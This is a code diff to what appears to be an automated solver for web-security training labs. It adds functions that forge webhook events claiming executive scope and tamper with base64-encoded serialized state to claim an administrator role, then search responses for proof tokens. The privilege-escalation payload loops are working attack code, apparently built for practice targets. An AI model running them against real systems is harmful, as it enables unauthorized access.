@@ -11,6 +11,7 @@ import hashlib
 import hmac
 import json
 import re
+import threading
 import time
 import urllib.error
 import urllib.parse
@@ -20,6 +21,8 @@ from typing import Any, Callable
 PROOF_PATTERN = re.compile(r"proof_[0-9a-fA-F]{32}")
 DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 DEFAULT_TIMEOUT = 10.0
+
+_TLS = threading.local()
 
 
 class WebHandlerError(Exception):
@@ -35,6 +38,10 @@ def _request(
     timeout: float = DEFAULT_TIMEOUT,
 ) -> tuple[int, str, dict[str, str]]:
     """Perform an HTTP request and return (status_code, body_text, headers_dict)."""
+    tls_req = getattr(_TLS, "request", None)
+    if tls_req is not None:
+        return tls_req(url, method=method, data=data, headers=headers, cookie=cookie, timeout=timeout)
+
     req_headers = {"User-Agent": DEFAULT_UA}
     if cookie:
         req_headers["Cookie"] = cookie
@@ -973,6 +980,95 @@ def solve_dynamic_flow(target_url: str, guide_route: str) -> str:
     return ""
 
 
+def solve_webhook(target_url: str) -> str:
+    """Exploit insecure webhook receiver consuming untrusted forged events (Day 26)."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+    clues = json.loads(clues_body)
+    feat_route = clues.get("feature_route", "/dispatch")
+    event_type = clues.get("event_type", "case.promoted")
+    scope = clues.get("owner_scope", "executive")
+
+    payloads = [
+        {"event": event_type, "owner": scope},
+        {"event_type": event_type, "owner_scope": scope},
+        {"event": event_type, "scope": scope},
+        {"event_type": event_type, "scope": scope},
+        {"event": event_type, "role": scope},
+        {"event_type": event_type, "role": scope},
+        {"event": event_type, "owner": "executive"},
+        {"event_type": event_type, "owner_scope": "executive"},
+    ]
+    for pl in payloads:
+        data = json.dumps(pl).encode("utf-8")
+        status, body, headers = _request(
+            f"{base}{feat_route}",
+            method="POST",
+            data=data,
+            headers={"Content-Type": "application/json"},
+        )
+        proof = _extract_proof(body, headers)
+        if proof:
+            return proof
+
+    raise WebHandlerError("Webhook dispatch did not yield proof")
+
+
+def solve_deserialization(target_url: str) -> str:
+    """Exploit untrusted serialized state object binding administrator role (Day 26)."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    clues: dict[str, Any] = {}
+    if status == 200:
+        try:
+            clues = json.loads(clues_body)
+        except Exception:
+            pass
+    feat_route = clues.get("feature_route", "/process")
+    fmt_route = clues.get("state_format_route", "/api/state-format")
+
+    # Inspect state format route if present
+    req_field = "state"
+    status, fmt_body, _ = _request(f"{base}{fmt_route}")
+    if status == 200:
+        try:
+            fmt_data = json.loads(fmt_body)
+            req_field = fmt_data.get("request_field", req_field)
+            if "transport" in fmt_data and " " in fmt_data["transport"]:
+                feat_route = fmt_data["transport"].split(" ")[-1]
+        except Exception:
+            pass
+
+    state_variants = [
+        {"user": "analyst", "role": "administrator"},
+        {"role": "administrator"},
+        {"user": "administrator", "role": "administrator"},
+        {"user": "admin", "role": "admin"},
+        {"role": "admin", "is_admin": True},
+        {"user": "analyst", "role": "executive"},
+        {"role": "executive", "scope": "executive"},
+    ]
+
+    for state_obj in state_variants:
+        raw_json = json.dumps(state_obj).encode("utf-8")
+        b64_state = base64.urlsafe_b64encode(raw_json).decode("utf-8").rstrip("=")
+        body_json = json.dumps({req_field: b64_state}).encode("utf-8")
+
+        status, body, headers = _request(
+            f"{base}{feat_route}",
+            method="POST",
+            data=body_json,
+            headers={"Content-Type": "application/json"},
+        )
+        proof = _extract_proof(body, headers)
+        if proof:
+            return proof
+
+    raise WebHandlerError("Serialized state exploit did not yield proof")
+
+
 # ---------------------------------------------------------------------------
 # Handler Registry & Dynamic Dispatcher
 # ---------------------------------------------------------------------------
@@ -995,6 +1091,8 @@ CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
     16: solve_command_injection,
     17: solve_password_reset,
     18: solve_graphql,
+    19: solve_webhook,
+    20: solve_deserialization,
 }
 
 
@@ -1019,6 +1117,12 @@ def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
 
             if "recovery_guide_route" in clues or "recovery" in clues_body:
                 return solve_password_reset(target_url)
+
+            if "state_format_route" in clues or framework == "Quarkus" or "state_format" in clues_body:
+                return solve_deserialization(target_url)
+
+            if "event_type" in clues or framework == "Starlette" or "webhook" in clues_body:
+                return solve_webhook(target_url)
 
             if "protected_reference" in clues or framework == "GraphQL.js" or "graphql" in feat_route:
                 return solve_graphql(target_url)
